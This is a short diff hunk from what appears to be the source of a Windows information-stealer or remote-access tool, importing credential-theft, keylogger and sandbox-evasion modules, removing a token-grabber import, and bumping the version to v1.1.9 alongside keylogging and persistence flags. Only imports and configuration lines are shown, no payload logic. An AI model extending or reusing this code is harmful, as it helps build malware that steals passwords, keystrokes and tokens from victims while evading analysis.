@@ -26,9 +26,9 @@ import psutil
 import win32pdh
 from winreg import *
 from ctypes import *
-from libraries import credentials,keylogger,tokengrabber,sandboxevasion
+from libraries import credentials,keylogger,sandboxevasion
 
-VERSION = "v1.1.8"
+VERSION = "v1.1.9"
 
 KEYLOG = {KEYLOG}
 PERSISTENT = {PERSISTENT}
